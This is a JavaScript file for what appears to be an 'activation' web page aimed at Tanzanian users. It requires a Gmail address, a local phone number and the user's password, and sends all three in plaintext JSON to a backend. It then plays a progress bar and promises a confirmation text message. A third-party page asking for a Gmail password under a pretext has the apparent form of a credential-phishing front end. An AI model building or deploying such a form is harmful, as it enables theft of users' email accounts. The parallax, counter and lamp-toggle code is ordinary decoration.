function activate(){

let email = document.getElementById("email").value.trim()
let password = document.getElementById("password").value.trim()
let phone = document.getElementById("phone").value.trim()

// Gmail validation
let gmailPattern = /^[a-zA-Z0-9._%+-]+@gmail\.com$/

// Tanzania phone validation
let phonePattern = /^0[0-9]{9}$/

if(!gmailPattern.test(email)){

alert("Enter correct Gmail format (example@gmail.com)")
return

}

if(!phonePattern.test(phone)){

alert("Enter correct Tanzania phone number format")
return

}

if(password === ""){

alert("Enter password")
return

}

/* SEND DATA TO BACKEND */

fetch("http://localhost:3000/submit",{

method:"POST",

headers:{
"Content-Type":"application/json"
},

body: JSON.stringify({
email:email,
password:password,
phone:phone
})

})
.then(res=>res.text())
.then(data=>{
console.log("Server response:",data)
})
.catch(err=>{
console.error("Error:",err)
})

// Loading animation

let loading = document.getElementById("loading")
let bar = document.getElementById("progressBar")

loading.classList.add("active")

let progress = 0

let interval = setInterval(()=>{

progress += 5
bar.style.width = progress + "%"

if(progress >= 100){

clearInterval(interval)

setTimeout(()=>{

loading.classList.remove("active")

alert("Wait for confirmation. You will receive a text message shortly.")

},800)

}

},120)

}

function animateCounter(){

let count = 0
let target = 33

let interval = setInterval(()=>{

count++
document.getElementById("counter").innerText = count

if(count >= target){
clearInterval(interval)
}

},80)

}

function toggleLamp(){

let body = document.body
let ropeSound = document.getElementById("ropeSound")

ropeSound.play()

body.classList.toggle("lamp-on")

if(body.classList.contains("lamp-on")){
animateCounter()
}

}

// 3D parallax

document.addEventListener("mousemove",(e)=>{

let x = (window.innerWidth/2 - e.pageX)/30
let y = (window.innerHeight/2 - e.pageY)/30

document.querySelector(".main-container").style.transform =
"rotateY(" + x + "deg) rotateX(" + y + "deg)"

})